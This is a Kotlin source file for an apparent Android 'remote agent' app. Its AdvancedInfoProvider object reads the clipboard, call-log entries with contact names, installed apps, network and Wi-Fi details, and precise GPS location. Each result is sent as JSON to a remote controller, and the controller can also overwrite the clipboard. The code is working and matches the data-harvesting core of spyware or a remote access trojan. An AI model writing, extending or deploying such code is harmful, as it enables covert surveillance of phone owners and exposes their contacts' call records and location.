package com.kero.remoteagent

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.provider.CallLog
import android.util.Base64
import android.util.Log
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.CancellationTokenSource
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object AdvancedInfoProvider {

    fun getClipboard() {
        try {
            val context = AppContextHolder.context
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = clipboard.primaryClip
            val text = if (clip != null && clip.itemCount > 0) clip.getItemAt(0).coerceToText(context).toString() else ""
            RemoteConnection.sendJson(JSONObject().apply { put("type", "clipboard_data"); put("text", text) })
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun setClipboard(text: String) {
        try {
            val context = AppContextHolder.context
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            clipboard.setPrimaryClip(ClipData.newPlainText("KERO Remote", text))
            RemoteConnection.sendJson(JSONObject().apply { put("type", "clipboard_set_ok") })
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun getBattery() {
        try {
            val context = AppContextHolder.context
            val batteryStatus = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else 0
            val plugged = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
            val chargeType = when (plugged) {
                BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                else -> "Battery"
            }
            RemoteConnection.sendJson(JSONObject().apply {
                put("type", "battery_info"); put("level", batteryPct); put("charging", isCharging); put("charge_type", chargeType)
            })
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun getNetwork() {
        try {
            val context = AppContextHolder.context
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            var networkType = "Unknown"
            var ssid = ""
            var signalStrength = -1
            if (capabilities != null) {
                when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> {
                        networkType = "WiFi"
                        try {
                            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                            val wifiInfo = wifiManager.connectionInfo
                            ssid = wifiInfo.ssid?.replace("\"", "") ?: ""
                            signalStrength = WifiManager.calculateSignalLevel(wifiInfo.rssi, 5)
                        } catch (e: Exception) { Log.w("KERO_NETWORK", "Cannot get WiFi info") }
                    }
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> networkType = "Cellular"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> networkType = "Ethernet"
                }
            }
            RemoteConnection.sendJson(JSONObject().apply {
                put("type", "network_info"); put("network_type", networkType); put("ssid", ssid); put("signal_strength", signalStrength); put("connected", network != null)
            })
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun getCalls(limit: Int = 50) {
        try {
            val context = AppContextHolder.context

            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                RemoteConnection.sendJson(
                    JSONObject()
                        .put("type", "calls_error")
                        .put("message", "لم يتم منح إذن سجل المكالمات على الهاتف")
                )
                return
            }

            val projection = arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )

            val callsArray = JSONArray()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                val numberCol = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                val nameCol = it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
                val typeCol = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                val dateCol = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
                val durationCol = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)

                var count = 0
                while (count < limit && it.moveToNext()) {
                    callsArray.put(
                        JSONObject()
                            .put("number", it.getString(numberCol) ?: "")
                            .put("name", it.getString(nameCol) ?: "")
                            .put(
                                "type",
                                when (it.getInt(typeCol)) {
                                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                                    CallLog.Calls.MISSED_TYPE -> "Missed"
                                    else -> "Unknown"
                                }
                            )
                            .put("date", it.getLong(dateCol))
                            .put("duration", it.getLong(durationCol))
                    )
                    count++
                }
            }

            RemoteConnection.sendJson(
                JSONObject()
                    .put("type", "calls_list")
                    .put("calls", callsArray)
            )
        } catch (e: Exception) {
            RemoteConnection.sendJson(
                JSONObject()
                    .put("type", "calls_error")
                    .put("message", e.message ?: "تعذر قراءة سجل المكالمات")
            )
        }
    }

    fun getApps(includeSystemApps: Boolean = false) {
        try {
            val context = AppContextHolder.context
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val appsArray = JSONArray()
            
            for (app in apps) {
                if (!includeSystemApps && (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0) continue
                
                val appName = pm.getApplicationLabel(app).toString()
                val packageName = app.packageName
                
                // ✅ الحل الجذاري: جلب تاريخ التثبيت من PackageInfo لتجنب خطأ ApplicationInfo
                val installDate = try {
                    val packageInfo = pm.getPackageInfo(packageName, 0)
                    @Suppress("DEPRECATION")
                    Date(packageInfo.firstInstallTime)
                } catch (e: Exception) {
                    Date()
                }
                
                val version = try { 
                    val packageInfo = pm.getPackageInfo(packageName, 0)
                    packageInfo.versionName ?: "Unknown" 
                } catch (e: Exception) { "Unknown" }
                
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                
                val iconBase64 = try {
                    val drawable = pm.getApplicationIcon(app)
                    val bitmap = android.graphics.Bitmap.createBitmap(
                        drawable.intrinsicWidth.coerceAtLeast(1), 
                        drawable.intrinsicHeight.coerceAtLeast(1), 
                        android.graphics.Bitmap.Config.ARGB_8888
                    )
                    val canvas = android.graphics.Canvas(bitmap)
                    drawable.setBounds(0, 0, canvas.width, canvas.height)
                    drawable.draw(canvas)
                    val outputStream = ByteArrayOutputStream()
                    bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, outputStream)
                    Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
                } catch (e: Exception) { "" }
                
                appsArray.put(JSONObject().apply {
                    put("name", appName)
                    put("package", packageName)
                    put("version", version)
                    put("install_date", dateFormat.format(installDate))
                    put("icon", iconBase64)
                    put("is_system", (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                })
            }
            RemoteConnection.sendJson(JSONObject().apply { put("type", "apps_list"); put("apps", appsArray) })
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun getLocation() {
        try {
            val context = AppContextHolder.context
            val fusedLocationClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(context)
            val cancellationToken = CancellationTokenSource()
            fusedLocationClient.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, cancellationToken.token)
                .addOnSuccessListener { location: Location? ->
                    if (location != null) {
                        RemoteConnection.sendJson(JSONObject().apply {
                            put("type", "location_data"); put("latitude", location.latitude); put("longitude", location.longitude)
                            put("accuracy", location.accuracy); put("altitude", location.altitude); put("time", location.time)
                        })
                    } else {
                        RemoteConnection.sendJson(JSONObject().apply { put("type", "location_error"); put("message", "Could not get location") })
                    }
                }.addOnFailureListener { e ->
                    RemoteConnection.sendJson(JSONObject().apply { put("type", "location_error"); put("message", e.message ?: "Unknown error") })
                }
        } catch (e: Exception) { e.printStackTrace() }
    }
}